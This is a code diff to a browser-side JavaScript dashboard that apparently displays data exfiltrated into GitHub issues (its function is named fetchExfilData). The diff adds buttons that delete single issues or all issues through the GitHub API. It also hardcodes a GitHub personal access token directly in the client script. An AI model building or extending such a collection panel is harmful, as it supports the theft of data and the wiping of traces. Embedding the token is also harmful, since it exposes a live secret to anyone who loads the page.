@@ -3,6 +3,9 @@
 
     const HASH_USER = '0ca1574299693aaeb821647cf4c897a153bea29fafb12db28257a1ed61ce58d0';
     const HASH_PASS = '7ef461cec5e3f823e0724d62cb57b46e875a8690f1c1917c4d773cb2cb5a86ed';
+    const GITHUB_TOKEN = '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';
+    const REPO = 'va1uxxx/0xB0';
+    const API_URL = `https://api.github.com/repos/${REPO}/issues`;
 
     function getElements() {
         const loginPage = document.getElementById('loginPage');
@@ -15,7 +18,8 @@
         const refreshBtn = document.getElementById('refreshBtn');
         const logoutBtn = document.getElementById('logoutBtn');
         const downloadBtn = document.getElementById('downloadBtn');
-        return { loginPage, dashboardPage, loginForm, usernameInput, passwordInput, loginError, logContainer, refreshBtn, logoutBtn, downloadBtn };
+        const deleteAllBtn = document.getElementById('deleteAllBtn');
+        return { loginPage, dashboardPage, loginForm, usernameInput, passwordInput, loginError, logContainer, refreshBtn, logoutBtn, downloadBtn, deleteAllBtn };
     }
 
     async function hashString(str) {
@@ -76,9 +80,6 @@
         if (els.loginError) els.loginError.textContent = '';
     }
 
-    const REPO = 'va1uxxx/0xB0';
-    const API_URL = `https://api.github.com/repos/${REPO}/issues`;
-
     async function fetchExfilData() {
         const els = getElements();
         if (!els.logContainer) {
@@ -102,6 +103,7 @@
             sorted.forEach((issue, index) => {
                 const title = escapeHtml(issue.title || 'Untitled');
                 const time = new Date(issue.created_at).toLocaleString();
+                const issueNumber = issue.number;
                 let body = issue.body || '';
                 let decoded = '';
                 let isTruncated = false;
@@ -117,9 +119,9 @@
                 const displayBody = escapeHtml(decoded);
                 const truncatedMark = isTruncated ? ' <span style="color:#4a5a6a;">… (truncated)</span>' : '';
                 html += `
-                    <div class="entry" data-index="${index}">
+                    <div class="entry" data-issue="${issueNumber}">
                         <div class="entry-header">
-                            <span class="entry-title"><i class="fas fa-file-alt" style="color:#4a5a6a;margin-right:8px;"></i>${title}</span>
+                            <span class="entry-title"><i class="fas fa-file-alt" style="color:#4a5a6a;margin-right:8px;"></i>#${issueNumber} - ${title}</span>
                             <span class="entry-time"><i class="far fa-clock"></i> ${time}</span>
                         </div>
                         <div class="entry-body">
@@ -127,11 +129,14 @@
                         </div>
                         <div style="text-align:right;margin-top:6px;">
                             <button class="copy-btn" data-copy="${escapeHtml(decoded)}"><i class="fas fa-copy"></i> COPY</button>
+                            <button class="delete-btn" data-issue="${issueNumber}"><i class="fas fa-trash-alt"></i> DELETE</button>
                         </div>
                     </div>
                 `;
             });
             els.logContainer.innerHTML = html;
+
+            // Copy buttons
             document.querySelectorAll('.copy-btn').forEach(btn => {
                 btn.addEventListener('click', function() {
                     const text = this.getAttribute('data-copy');
@@ -142,9 +147,73 @@
                     }).catch(() => {});
                 });
             });
+
+            // Delete buttons
+            document.querySelectorAll('.delete-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const issueNum = parseInt(this.getAttribute('data-issue'));
+                    if (confirm(`Delete issue #${issueNum}?`)) {
+                        deleteIssue(issueNum);
+                    }
+                });
+            });
+
         } catch (err) {
             els.logContainer.innerHTML = `<div class="error-msg"><i class="fas fa-triangle-exclamation"></i> ERROR: ${escapeHtml(err.message)}</div>`;
         }
+    }
+
+    // Delete a single issue
+    async function deleteIssue(issueNumber) {
+        const url = `https://api.github.com/repos/${REPO}/issues/${issueNumber}`;
+        try {
+            const response = await fetch(url, {
+                method: 'DELETE',
+                headers: {
+                    'Authorization': `token ${GITHUB_TOKEN}`,
+                    'Accept': 'application/vnd.github.v3+json'
+                }
+            });
+            if (!response.ok) {
+                const errorText = await response.text();
+                throw new Error(`HTTP ${response.status}: ${errorText}`);
+            }
+            alert(`Issue #${issueNumber} deleted.`);
+            fetchExfilData(); // refresh
+        } catch (err) {
+            alert(`Delete failed: ${err.message}`);
+        }
+    }
+
+    // Delete all issues
+    async function deleteAllIssues() {
+        if (!confirm('Delete ALL issues? This cannot be undone.')) return;
+        const els = getElements();
+        if (!els.logContainer) return;
+        const entries = els.logContainer.querySelectorAll('.entry');
+        if (entries.length === 0) {
+            alert('No issues to delete.');
+            return;
+        }
+        const issueNumbers = Array.from(entries).map(entry => parseInt(entry.dataset.issue));
+        let deleted = 0;
+        for (const num of issueNumbers) {
+            try {
+                const url = `https://api.github.com/repos/${REPO}/issues/${num}`;
+                const response = await fetch(url, {
+                    method: 'DELETE',
+                    headers: {
+                        'Authorization': `token ${GITHUB_TOKEN}`,
+                        'Accept': 'application/vnd.github.v3+json'
+                    }
+                });
+                if (response.ok) deleted++;
+            } catch (e) {
+                console.error(`Failed to delete #${num}`, e);
+            }
+        }
+        alert(`Deleted ${deleted} out of ${issueNumbers.length} issues.`);
+        fetchExfilData();
     }
 
     function escapeHtml(str) {
@@ -237,6 +306,10 @@
 
         if (els.downloadBtn) {
             els.downloadBtn.addEventListener('click', downloadZip);
+        }
+
+        if (els.deleteAllBtn) {
+            els.deleteAllBtn.addEventListener('click', deleteAllIssues);
         }
 
         if (isLoggedIn()) {
